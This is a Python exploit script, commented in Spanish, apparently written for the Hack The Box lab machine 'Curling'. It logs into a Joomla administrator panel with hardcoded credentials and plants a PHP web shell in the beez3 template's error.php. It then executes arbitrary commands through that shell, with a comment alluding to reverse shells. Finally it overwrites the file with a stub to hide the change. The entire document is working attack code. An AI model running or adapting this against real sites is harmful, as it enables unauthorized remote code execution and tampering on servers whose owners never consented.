#!/usr/bin/python3

import signal, argparse
import requests
import re

# Clases --------------------------.
class Color:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

# Funciones -----------------------.
def def_handler(sig, frame):  # Ctrl+C
    print(Color.RED + "\nsaLi3ndoo..\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

def arguments():  # argumentos que recibimos
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', dest="URL", type=str, default="http://10.10.10.150", help="URL del sitio Joomla (default: http://10.10.10.150)")
    parse.add_argument('-c', dest="command", type=str, default="id", help="Comando a ejecutar en el sistema (default: id)")
    return parse.parse_args()

def login():  # logeandonos donas
    session = requests.Session()
    r = session.get(URL + "/administrator/index.php")

    hidden_return_value = re.findall(r'<input type="hidden" name="return" value="(.*?)"', r.text)[0]
    hidden_csrf_token_value = re.findall(r'<script type="application/json" class="joomla-script-options new">{"csrf.token":"(.*?)"', r.text)[0]

    data_post = {
        "username": "floris",
        "passwd": "Curling2018!",
        "option": "com_login",
        "task": "login",
        "return": hidden_return_value,
        hidden_csrf_token_value: "1"
    }
    r = session.post(URL + "/administrator/index.php", data=data_post)

    return session

def update_template(session, template_content):  # actualizamosPlantillasConLocuras
    data_get = {
        "option": "com_templates",
        "view": "template",
        "id": "503",
        "file": "L2Vycm9yLnBocA"
    }
    # Extraemos nuevo token de sesión
    r = session.get(URL + "/administrator/index.php", params=data_get)
    hidden_csrf_token_value = re.findall(r'<script type="application/json" class="joomla-script-options new">{"csrf.token":"(.*?)"', r.text)[0]

    data_post = {
        "jform[source]": template_content,
        "task": "template.apply",
        hidden_csrf_token_value: "1",
        "jform[extension_id]": "503",
        "jform[filename]":"/error.php"
    }
    r = session.post(URL + "/administrator/index.php", params=data_get, data=data_post)
    if "File saved." not in r.text:
        print(Color.RED + "\nProblemas modificando el archivo error.php del template beez3.\n" + Color.END)
        exit(1)

def exe_commands(command):  # acá ejecutamos los comandos en el sistema
    try:
        r = requests.get(URL + '/templates/beez3/error.php', params={"xmd": command}, timeout=4)
        print("\n" + Color.CYAN + r.text + Color.END)
    except requests.exceptions.Timeout:  # en caso de lanzar una reverse shell evitamos que la conexión se quede pegada
        print("[+] Ejecutando reverse shell, espera un toque... (Si no estas ejecutando una revsh, entonces la máquina se murio, F)")

def main():  # elCentrico
    print("[+] Iniciamos sesión como " + Color.BLUE + "floris" + Color.END + ".")
    session = login()

    print("[+] Modificamos template con nuestro código PHP.")
    template_content = "<?php system($_GET['xmd']); ?>"
    update_template(session, template_content)

    print(f"[+] Ejecutando {Color.BLUE + args.command + Color.END} en el sistema.")
    exe_commands(args.command)

    # Dejamos todo "como antes" (el contenido de `error.php` es muy largo, así que simulamos un error)
    template_content = "<?php\n/**\n * @package     Joomla.Site\n * @subpackage  Templates.beez3\n *\n * @copyright   Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.\n * @license     GNU General Public License version 2 or later; see LICENSE.txt\n */\n\necho \"Something weird happened, sorry for the inconvenience.\";"
    update_template(session, template_content)

    print("[+] nOs v1mo0oooooOOoos...")

# Inicio del programa -------------.
if __name__ == '__main__':
    args = arguments()
    URL = args.URL

    main()